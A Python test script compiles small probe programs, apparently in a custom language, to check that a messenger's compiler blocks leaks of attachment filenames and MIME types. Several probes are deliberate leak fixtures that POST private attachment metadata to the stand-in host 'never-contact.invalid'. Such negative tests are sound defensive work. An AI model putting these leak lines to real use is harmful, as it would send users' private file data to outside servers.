#!/usr/bin/env python3
"""Check actual attachment metadata labels and closed errors; never execute probes.

The focused source projection does not qualify the entire application or its
native parsers. Run the complete core build and reviewed-report gate separately.
"""
import argparse
import hashlib
import json
import os
from pathlib import Path
import shutil
import subprocess
import time
import tomllib

PROBES = {
    'private-aad': '''from Attachments.Protocol import AttachmentManifest, AttachmentError, open_manifest, seal_manifest, seal_bound_chunk
fn refuse(secret :: borrow SecretBytes, encoded :: Plaintext<Bytes>, value :: Bytes) -> Bytes!AttachmentError do
  seal_bound_chunk(secret, encoded, 0, value)
end
fn main() do nil end
''',
    'private-control': '''from Attachments.Protocol import AttachmentManifest, AttachmentError, open_manifest, seal_manifest, seal_bound_chunk
fn refuse(secret :: borrow SecretBytes, value :: AttachmentManifest, flag :: Plaintext<Bool>) -> Bytes!AttachmentError do
  if flag do seal_manifest(secret, value) else Ok(Bytes.empty()) end
end
fn main() do nil end
''',
    'private-filename': '''from Attachments.Protocol import AttachmentManifest, AttachmentError, open_manifest, seal_manifest, seal_bound_chunk
fn refuse(secret :: borrow SecretBytes, encoded :: Bytes) -> Int!AttachmentError do
  let value = open_manifest(secret, encoded)?
  Ok(Http.body_bytes(Http.build(:post, "https://never-contact.invalid"), value.filename))
end
fn main() do nil end
''',
    'private-index': '''from Attachments.Protocol import AttachmentManifest, AttachmentError, open_manifest, seal_manifest, seal_bound_chunk
fn refuse(secret :: borrow SecretBytes, encoded :: Bytes, index :: Plaintext<Int>, value :: Bytes) -> Bytes!AttachmentError do
  seal_bound_chunk(secret, encoded, index, value)
end
fn main() do nil end
''',
    'private-manifest-fields': '''from Attachments.Protocol import AttachmentManifest, AttachmentError, open_manifest, seal_manifest, seal_bound_chunk
fn refuse(value :: AttachmentManifest) -> Int do
  Http.body_bytes(Http.build(:post, "https://never-contact.invalid"), value.filename)
end
fn main() do nil end
''',
    'private-mime': '''from Attachments.Protocol import AttachmentManifest, AttachmentError, open_manifest, seal_manifest, seal_bound_chunk
fn refuse(secret :: borrow SecretBytes, encoded :: Bytes) -> Int!AttachmentError do
  let value = open_manifest(secret, encoded)?
  Ok(Http.body_bytes(Http.build(:post, "https://never-contact.invalid"), value.mime_type))
end
fn main() do nil end
''',
    'private-seal-error': '''fn refuse(key :: borrow AeadKey, nonce :: Bytes, input :: Plaintext<Bytes>) -> Int do
  let result = declassify_discriminant(Crypto.aead_seal(key, nonce, Bytes.empty(), input),
    "proof-only encryption success or failure")
  case result do
    Err(InvalidLength(_, actual)) -> do
      println(Int.to_string(actual))
      0
    end
    _ -> 0
  end
end
fn main() do nil end
''',
    'sealed-positive': '''from Attachments.Protocol import AttachmentManifest, AttachmentError, open_manifest, seal_manifest, seal_bound_chunk
fn manifest(secret :: borrow SecretBytes, value :: AttachmentManifest) -> Bytes!AttachmentError do
  seal_manifest(secret, value)
end
fn chunk(secret :: borrow SecretBytes, encoded :: Bytes, input :: Plaintext<Bytes>) -> Bytes!AttachmentError do
  seal_bound_chunk(secret, encoded, 0, input)
end
fn main() do nil end
''',
}


def sha(path):
    return hashlib.sha256(path.read_bytes()).hexdigest()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--product", type=Path, default=Path(__file__).resolve().parents[2])
    parser.add_argument("--protocol-package", type=Path)
    parser.add_argument("--mobile-package", type=Path)
    parser.add_argument("--compiler", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()
    compiler = args.compiler.resolve()
    protocol = (args.protocol_package or args.product / "packages/messenger-protocol").resolve()
    mobile = (args.mobile_package or args.product / "packages/mobile-core").resolve()
    output = args.output.resolve()
    output.mkdir(parents=True, exist_ok=False)
    evidence = output / "evidence.json"
    record = {"status": "running", "compiler": str(compiler), "compiler_sha256": sha(compiler),
              "scope": "Exact attachment protocol projection, field-label mutations and closed error mapping; not native ingress or whole-app approval.",
              "inputs": {}, "results": []}
    runtime = os.environ.get("MESH_RT_LIB_PATH")
    if runtime:
        record["runtime_sha256"] = sha(Path(runtime))

    def capture(source, target):
        digest = sha(source)
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(source, target)
        if sha(target) != digest:
            raise RuntimeError("input changed during capture: " + str(source))
        record["inputs"][str(source)] = digest

    def run(name, code, source, expectation):
        path = output / name
        (path / "attachments").mkdir(parents=True)
        (path / "attachments/protocol.mpl").write_text(source)
        (path / "mesh.toml").write_text('[package]\nname="attachment-metadata-proof"\nversion="0.1.0"\n'
                                        '[dependencies]\nmesh-binary={path=' + json.dumps(str(binary)) + '}\n')
        probe = path / "main.mpl"
        probe.write_text(code)
        artifact = path / "proof"
        report = path / "report.json"
        command = [str(compiler), "build", str(path), "-o", str(artifact), "--plaintext-report", str(report), "--json"]
        start = time.monotonic()
        result = subprocess.run(command, capture_output=True, text=True)
        log = result.stdout + result.stderr
        (path / "build.log").write_text(log)
        diagnostics = []
        for line in log.splitlines():
            try:
                item = json.loads(line)
            except ValueError:
                continue
            if item.get("code"):
                diagnostics.append(item)
        errors = [item for item in diagnostics if item["code"] != "C0001"]
        if expectation == "allow":
            passed = result.returncode == 0 and artifact.exists() and report.exists() and not errors
        else:
            passed = result.returncode != 0 and not artifact.exists() and not report.exists() and bool(errors)
            if expectation == "E0093":
                passed = passed and all(item["code"] == "E0093" for item in errors)
                passed = passed and any(item.get("file") == str(probe) for item in errors)
            else:
                passed = passed and all(item["code"] == "E0012" and "exhaust" in item["message"].lower() for item in errors)
        item = {"name": name, "expectation": expectation, "passed": passed, "exit_code": result.returncode,
                "seconds": round(time.monotonic() - start, 3), "codes": [item["code"] for item in diagnostics],
                "command": command, "probe_sha256": sha(probe), "protocol_sha256": sha(path / "attachments/protocol.mpl"),
                "log_sha256": sha(path / "build.log")}
        record["results"].append(item)
        evidence.write_text(json.dumps(record, indent=2) + "\n")
        print(json.dumps(item), flush=True)
        return passed

    try:
        manifest = protocol / "mesh.toml"
        capture(manifest, output / "inputs/protocol.toml")
        dependency = tomllib.loads(manifest.read_text())["dependencies"]["mesh-binary"]["path"]
        binary_source = (protocol / dependency).resolve()
        binary = output / "inputs/mesh-binary"
        for source in sorted(binary_source.rglob("*")):
            if source.is_file() and source.suffix in (".mpl", ".toml", ".lock"):
                capture(source, binary / source.relative_to(binary_source))
        if tomllib.loads((binary / "mesh.toml").read_text()).get("dependencies"):
            raise RuntimeError("Binary.Reader dependency closure changed; review the focused projection")
        capture(protocol / "attachments/protocol.mpl", output / "inputs/protocol.mpl")
        capture(mobile / "mobile/attachments.mpl", output / "inputs/mobile-attachments.mpl")
        source = (output / "inputs/protocol.mpl").read_text()
        for label in ("filename :: Plaintext<Bytes>", "mime_type :: Plaintext<Bytes>"):
            if source.count(label) != 1:
                raise RuntimeError("expected exactly one attachment field label: " + label)
        for name, code in PROBES.items():
            run(name, code, source, "allow" if name == "sealed-positive" else "E0093")
        mutant = source.replace("filename :: Plaintext<Bytes>", "filename :: Bytes").replace("mime_type :: Plaintext<Bytes>", "mime_type :: Bytes")
        for name in ("private-filename", "private-mime", "private-manifest-fields"):
            run("removed-labels-" + name, PROBES[name], mutant, "allow")
        mapping = (output / "inputs/mobile-attachments.mpl").read_text()
        start = mapping.index("fn attachment_error_class(")
        end = mapping.index("\nfn ", mapping.index("fn describe_attachment_error(", start) + 4)
        classifier = "from Attachments.Protocol import AttachmentError\n" + mapping[start:end] + "\nfn main() do nil end\n"
        if source.count("  InvalidManifest\n") != 1:
            raise RuntimeError("AttachmentError changed; review the exhaustive-error mutation")
        future = source.replace("  InvalidManifest\n", "  FutureFailure(value :: Bytes)\n  InvalidManifest\n", 1)
        run("future-error-variant", classifier, future, "exhaustive")
        for path, digest in record["inputs"].items():
            if sha(Path(path)) != digest:
                raise RuntimeError("live input changed during proof: " + path)
        if sha(compiler) != record["compiler_sha256"] or (runtime and sha(Path(runtime)) != record["runtime_sha256"]):
            raise RuntimeError("toolchain changed during proof")
        if not all(item["passed"] for item in record["results"]):
            raise RuntimeError("one or more attachment metadata checks failed")
        record["status"] = "passed"
    except Exception as error:
        record.update(status="failed", error=str(error))
        raise
    finally:
        evidence.write_text(json.dumps(record, indent=2) + "\n")


if __name__ == "__main__":
    main()
